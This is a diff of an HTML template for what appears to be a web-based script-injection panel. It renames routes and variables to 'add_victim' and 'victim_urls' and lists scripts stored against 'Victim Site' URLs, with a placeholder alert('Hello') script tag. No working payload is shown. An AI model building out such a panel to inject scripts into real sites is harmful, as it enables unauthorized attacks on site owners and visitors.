@@ -59,9 +59,9 @@
     <div>
         <label for="execute-script">Execute Script</label>
     </div>
-    <form action="{{ url_for('execute_script', email=email) }}" method="POST">
+    <form action="{{ url_for('add_victim', email=email) }}" method="POST">
         <div class="form-group">
-            <textarea class="form-control" name="script" id="execute-script" rows="4" placeholder="<script>alert('Hello');</script>"
+            <textarea class="form-control" name="execute-script" id="execute-script" rows="4" placeholder="<script>alert('Hello');</script>"
                 required></textarea>
         </div>
         <label for="victim_url">Victim Site</label>
@@ -77,12 +77,12 @@
             </tr>
         </thead>
         <tbody>
-            {% for url in secure_urls %}
+            {% for url in victim_urls %}
             <tr>
-                <td>{{url}}</td>
-                <td>A script</td>
+                <td>{{url[0]}}</td>
+                <td>{{url[1]}}</td>
                 <td>
-                    <form action="{{ url_for('delete_secure', email=email, url=url) }}" method="POST">
+                    <form action="{{ url_for('delete_victim', email=email, url=url[0]) }}" method="POST">
                         <button type="submit" class="btn btn-danger">Delete</button>
                     </form>
                 </td>
